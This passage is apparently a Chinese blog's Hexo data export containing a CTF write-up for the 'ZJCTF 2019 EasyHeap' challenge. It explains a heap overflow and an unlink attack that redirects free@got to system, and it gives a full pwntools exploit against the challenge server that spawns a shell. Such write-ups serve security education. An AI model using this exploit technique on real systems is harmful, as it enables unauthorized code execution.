EasyHeap","date":"2022-11-29T07:09:00.000Z","excerpt":"unlink 漏洞例题","_content":"\n#### 题目链接\n\n<https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap>\n\n#### 漏洞\n\n很明显在`ceate_heap`中size并没有存下来，然后`edit_heap`时也是用户自己输入size来编辑\n\n因此可以溢出\n\n#### 利用\n\nchecksec发现没有开启PIE，heaparray的地址可以直接使用\n\n1. 首先申请三个chunk\n\n   ```python\n   add(0x90,b\"MMMM\")\n   add(0x90,b\"MMMM\")\n   add(0x20,b\"/bin/sh\\x00\")\n   ```\n\n2. 构造一个unlink需要在第一个chunk内构造一个fakechunk\n\n   ```python\n   fake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\n   fake_chunk = fake_chunk.ljust(0x90,b'M')\n   fake_chunk += p64(0x90) + p64(0xa0)\n   edit(0,0x100,fake_chunk)\n   ```\n\n   ![](/img/[ZJCTF2019]EasyHeap/1.jpg)\n\n   对于chunk 0，`fd = heaparray - 0x18` `bk = heaparray - 0x10`，unlink chunk 0 时会将heaparray[0]指向`heaparray - 0x18`\n\n3. 这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin\n\n   ![](/img/[ZJCTF2019]EasyHeap/2.jpg)\n\n   查看heaparray地址上的值：\n   \n   ![](/img/[ZJCTF2019]EasyHeap/3.jpg)\n   \n   说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8\n   \n4. 这时edit(0)会从0x6020c8这个地址开始写，因此\n\n   ```python\n   payload = p64(0)*3 +p64(free_got)\n   edit(0,0x20 ,payload)\n   ```\n\n   又一次覆盖了heaparray[0]，指向了`free@got`\n\n5. 这时edit(0)会修改`free@got`的内容\n\n   ```python\n   edit(0,8,p64(system_plt))\n   ```\n\n   将其函数改为system函数的plt表\n\n   > 因为system没有被调用过，不能直接改成system@got\n\n6. delete(2)会调用free(\"/bin/sh\")，而free函数被替换成了system，因此得到了shell\n\n#### 完整exp\n\n```python\nfrom pwn import *\nr = remote(\"node4.buuoj.cn\",27679)\nelf = ELF(\"./easyheap\")\ndef add(size,content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('1')\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap:\")\n    r.sendline(content)\ndef edit(idx, size, content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('2')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap : \")\n    r.sendline(content)\ndef delete(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('3')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\nheaparray_addr = 0x6020E0\nsystem_plt = elf.plt['system']\nfree_got = elf.got['free']\n\nadd(0x90,b\"MMMM\")\nadd(0x90,b\"MMMM\")\nadd(0x20,b\"/bin/sh\\x00\")\n#gdb.attach(r)\n\nfake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\nfake_chunk = fake_chunk.ljust(0x90,b'M')\nfake_chunk += p64(0x90) + p64(0xa0)\nedit(0,0x100,fake_chunk)\ndelete(1)\n#gdb.attach(r)\npayload = p64(0)*3 +p64(free_got)\nedit(0,0x20 ,payload)\n#gdb.attach(r)\nedit(0,8,p64(system_plt))\ndelete(2)\nr.interactive()\n```\n\n","source":"_posts/[ZJCTF 2019]EasyHeap.md","raw":"---\ntitle: ZJCTF 2019 EasyHeap\ntags: [ctf-pwn,exp]\ndate: 2022-11-29 15:09:00\nexcerpt: unlink 漏洞例题\n---\n\n#### 题目链接\n\n<https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap>\n\n#### 漏洞\n\n很明显在`ceate_heap`中size并没有存下来，然后`edit_heap`时也是用户自己输入size来编辑\n\n因此可以溢出\n\n#### 利用\n\nchecksec发现没有开启PIE，heaparray的地址可以直接使用\n\n1. 首先申请三个chunk\n\n   ```python\n   add(0x90,b\"MMMM\")\n   add(0x90,b\"MMMM\")\n   add(0x20,b\"/bin/sh\\x00\")\n   ```\n\n2. 构造一个unlink需要在第一个chunk内构造一个fakechunk\n\n   ```python\n   fake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\n   fake_chunk = fake_chunk.ljust(0x90,b'M')\n   fake_chunk += p64(0x90) + p64(0xa0)\n   edit(0,0x100,fake_chunk)\n   ```\n\n   ![](/img/[ZJCTF2019]EasyHeap/1.jpg)\n\n   对于chunk 0，`fd = heaparray - 0x18` `bk = heaparray - 0x10`，unlink chunk 0 时会将heaparray[0]指向`heaparray - 0x18`\n\n3. 这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin\n\n   ![](/img/[ZJCTF2019]EasyHeap/2.jpg)\n\n   查看heaparray地址上的值：\n   \n   ![](/img/[ZJCTF2019]EasyHeap/3.jpg)\n   \n   说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8\n   \n4. 这时edit(0)会从0x6020c8这个地址开始写，因此\n\n   ```python\n   payload = p64(0)*3 +p64(free_got)\n   edit(0,0x20 ,payload)\n   ```\n\n   又一次覆盖了heaparray[0]，指向了`free@got`\n\n5. 这时edit(0)会修改`free@got`的内容\n\n   ```python\n   edit(0,8,p64(system_plt))\n   ```\n\n   将其函数改为system函数的plt表\n\n   > 因为system没有被调用过，不能直接改成system@got\n\n6. delete(2)会调用free(\"/bin/sh\")，而free函数被替换成了system，因此得到了shell\n\n#### 完整exp\n\n```python\nfrom pwn import *\nr = remote(\"node4.buuoj.cn\",27679)\nelf = ELF(\"./easyheap\")\ndef add(size,content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('1')\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap:\")\n    r.sendline(content)\ndef edit(idx, size, content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('2')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap : \")\n    r.sendline(content)\ndef delete(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('3')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\nheaparray_addr = 0x6020E0\nsystem_plt = elf.plt['system']\nfree_got = elf.got['free']\n\nadd(0x90,b\"MMMM\")\nadd(0x90,b\"MMMM\")\nadd(0x20,b\"/bin/sh\\x00\")\n#gdb.attach(r)\n\nfake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\nfake_chunk = fake_chunk.ljust(0x90,b'M')\nfake_chunk += p64(0x90) + p64(0xa0)\nedit(0,0x100,fake_chunk)\ndelete(1)\n#gdb.attach(r)\npayload = p64(0)*3 +p64(free_got)\nedit(0,0x20 ,payload)\n#gdb.attach(r)\nedit(0,8,p64(system_plt))\ndelete(2)\nr.interactive()\n```\n\n","slug":"[ZJCTF 2019]EasyHeap","published":1,"updated":"2022-11-29T07:51:29.346Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clb1x7ici0000kkufay3f11hy","content":"<h4 id=\"题目链接\"><a href=\"#题目链接\" class=\"headerlink\" title=\"题目链接\"></a>题目链接</h4><p><a href=\"https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap\">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p>\n<h4 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h4><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p>\n<p>因此可以溢出</p>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p>\n<ol>\n<li><p>首先申请三个chunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li>\n<li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/1.jpg\"></p>\n<p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p>\n</li>\n<li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/2.jpg\"></p>\n<p>查看heaparray地址上的值：</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/3.jpg\"></p>\n<p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p>\n</li>\n<li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br></code></pre></td></tr></table></figure>\n\n<p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p>\n</li>\n<li><p>这时edit(0)会修改<code>free@got</code>的内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure>\n\n<p>将其函数改为system函数的plt表</p>\n<blockquote>\n<p>因为system没有被调用过，不能直接改成system@got</p>\n</blockquote>\n</li>\n<li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p>\n</li>\n</ol>\n<h4 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">27679</span>)<br>elf = ELF(<span class=\"hljs-string\">&quot;./easyheap&quot;</span>)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx, size, content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br><br>heaparray_addr = <span class=\"hljs-number\">0x6020E0</span><br>system_plt = elf.plt[<span class=\"hljs-string\">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br>delete(<span class=\"hljs-number\">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<h4 id=\"题目链接\"><a href=\"#题目链接\" class=\"headerlink\" title=\"题目链接\"></a>题目链接</h4><p><a href=\"https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap\">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p>\n<h4 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h4><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p>\n<p>因此可以溢出</p>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p>\n<ol>\n<li><p>首先申请三个chunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li>\n<li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/1.jpg\"></p>\n<p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p>\n</li>\n<li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/2.jpg\"></p>\n<p>查看heaparray地址上的值：</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/3.jpg\"></p>\n<p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p>\n</li>\n<li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br></code></pre></td></tr></table></figure>\n\n<p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p>\n</li>\n<li><p>这时edit(0)会修改<code>free@got</code>的内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure>\n\n<p>将其函数改为system函数的plt表</p>\n<blockquote>\n<p>因为system没有被调用过，不能直接改成system@got</p>\n</blockquote>\n</li>\n<li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p>\n</li>\n</ol>\n<h4 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = remote(<span class=\"hljs-string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"hljs-number\">27679</span>)<br>elf = ELF(<span class=\"hljs-string\">&quot;./easyheap&quot;</span>)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx, size, content</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(size))<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class=\"hljs-string\">&quot;Index :&quot;</span>)<br>    r.sendline(<span class=\"hljs-built_in\">str</span>(idx))<br><br>heaparray_addr = <span class=\"hljs-number\">0x6020E0</span><br>system_plt = elf.plt[<span class=\"hljs-string\">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br>delete(<span class=\"hljs-number\">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"clajrmefw0001kguf8i1j3zxv","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clajrmeg40008kguf5mzaen26"},{"post_id":"clajrmefw0001kguf8i1j3zxv","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clajrmeg50009kgufa56kgmqh"},{"post_id":"clajrmefz0002kgufc7qf1x4g","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clajrmeg5000ckguffyjd9uco"},{"post_id":"clajrmefz0002kgufc7qf1x4g","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clajrmeg5000dkguf60bwbily"},{"post_id":"clajrmeg20004kgufh5hwcc7u","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clajrmeg6000ekgufefjj3px6"},{"post_id":"clajrmeg6000fkgufcovgdjgl","tag_id":"clajrmeg7000gkguf2rjy96mb","_id":"clajrmeg7000hkguf48af2s47"},{"post_id":"claknlrk20004zouf7n5lc6fn","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"claknlrk50005zouf7yfz3f84"},{"post_id":"clasg59en0000dguffskz39dl","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clasg59ew0001dguf7pizb2gs"},{"post_id":"clasg59en0000dguffskz39dl","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clasg59ew0002dguf05i46gg4"},{"post_id":"claxz2tb30000xsufcm8cb4c1","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"claxz2tbd0001xsuff1j2az93"},{"post_id":"claz2knfu0000isuf008c0h1e","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"claz2kng40001isuf7ju40ogi"},{"post_id":"clb0aoxan00007cuffcoo73lk","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clb0aoxaw00017cuf08zjejqt"},{"post_id":"clb0aoxan00007cuffcoo73lk","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clb0aoxaw00027cuf9yfc0mx0"},{"post_id":"clb1x7ici0000kkufay3f11hy","tag_id":"clajrmeg10003kguf8oyz8je2","_id":"clb1x7icn0001kkuf61kn2mwj"},{"post_id":"clb1x7ici0000kkufay3f11hy","tag_id":"clajrmeg30006kgufebifbwhd","_id":"clb1x7icn0002kkuf5pto7k2c"}],"Tag":[{"name":"ctf-pwn","_id":"clajrmeg10003kguf8oyz8je2"},{"name":"exp","_id":"clajrmeg30006kgufebifbwhd"},{"name":"Others","_id":"clajrmeg7000gkguf2rjy96mb"}]}}